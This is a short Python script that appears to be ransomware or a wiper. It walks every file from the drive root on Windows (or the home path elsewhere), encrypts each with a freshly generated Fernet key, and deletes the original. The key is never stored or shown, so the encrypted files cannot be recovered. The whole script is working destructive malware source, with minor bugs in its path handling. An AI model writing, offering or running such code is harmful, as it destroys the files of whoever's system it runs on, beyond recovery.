import concurrent.futures
import string
from random import choice
import os, platform
from cryptography.fernet import Fernet


def generate_private_key():
    print("Generate Private Key...")
    key = Fernet.generate_key()
    print("[+] Done\n")
    return key


def list_file(directory):
    list_file = []
    for dir, sub_dir, files in os.walk(directory):
        for file in files:
            list_file.append(os.path.join(dir, file))
    return list_file


def encrypt_file(file, key):
            input_file = file
            output_file = input_file + '.encrypted'
            with open(input_file, 'rb') as f:
                data = f.read()
            fernet = Fernet(key)
            encrypted = fernet.encrypt(data)
            with open(output_file, 'wb') as f:
                f.write(encrypted)
            try:
                os.remove(input_file)
            except:
                pass


if __name__ == "__main__":
    default_path= ""
    if platform.system() is "Windows":
        default_path = "C:\\"
    else :
        default_path = "~/"
    print(default_path)
    key = generate_private_key()
    print("Encrypting the files...")
    with concurrent.futures.ThreadPoolExecutor(max_workers = 10) as executor:
        future_to_file = {executor.submit(encrypt_file, file, key):
                              file for file in list_file(default_path)}
        for future in concurrent.futures.as_completed(future_to_file):
            file = future_to_file[future]
    print("Done")
